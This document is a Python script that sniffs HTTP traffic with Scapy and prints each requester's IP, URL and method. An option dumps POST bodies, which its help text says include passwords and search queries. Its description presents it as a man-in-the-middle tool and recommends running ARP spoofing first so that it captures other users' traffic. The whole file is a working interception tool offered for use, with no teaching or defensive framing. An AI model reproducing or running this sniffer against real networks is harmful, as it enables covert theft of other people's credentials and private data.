from scapy.all import sniff, IP, Raw
from scapy.layers.http import HTTPRequest
from colorama import init, Fore

# Initialize colorama
init()

# Define colors
GREEN = Fore.GREEN
RED   = Fore.RED
RESET = Fore.RESET

def sniff_packets(iface=None, show_raw=False):
    """
    Sniff port 80 packets with `iface`. If None (default), the
    Scapy's default interface is used.
    """
    if iface:
        # Sniff HTTP packets (port 80)
        sniff(filter="port 80", prn=lambda packet: process_packet(packet, show_raw), iface=iface, store=False)
    else:
        # Sniff with the default interface
        sniff(filter="port 80", prn=lambda packet: process_packet(packet, show_raw), store=False)

def process_packet(packet, show_raw):
    """
    This function is executed whenever a packet is sniffed.
    """
    if packet.haslayer(HTTPRequest):
        # If this packet is an HTTP Request
        url = packet[HTTPRequest].Host.decode() + packet[HTTPRequest].Path.decode()
        ip = packet[IP].src  # Get the requester's IP address
        method = packet[HTTPRequest].Method.decode()  # Get the request method
        print(f"\n{GREEN}[+] {ip} Requested {url} with {method}{RESET}")

        if show_raw and packet.haslayer(Raw) and method == "POST":
            # If show_raw flag is enabled, has raw data, and the method is "POST"
            print(f"\n{RED}[*] Some useful Raw data: {packet[Raw].load}{RESET}")

if __name__ == "__main__":
    import argparse

    # Set up argument parser
    parser = argparse.ArgumentParser(description="HTTP Packet Sniffer, useful when you're a man in the middle." \
                                                 " It is suggested that you run arp spoof before using this script, otherwise it'll sniff your personal packets.")
    parser.add_argument("-i", "--iface", help="Interface to use, default is scapy's default interface")
    parser.add_argument("--show-raw", dest="show_raw", action="store_true", help="Whether to print POST raw data, such as passwords, search queries, etc.")
    
    # Parse arguments
    args = parser.parse_args()
    iface = args.iface
    show_raw = args.show_raw
    
    # Start sniffing
    sniff_packets(iface, show_raw)
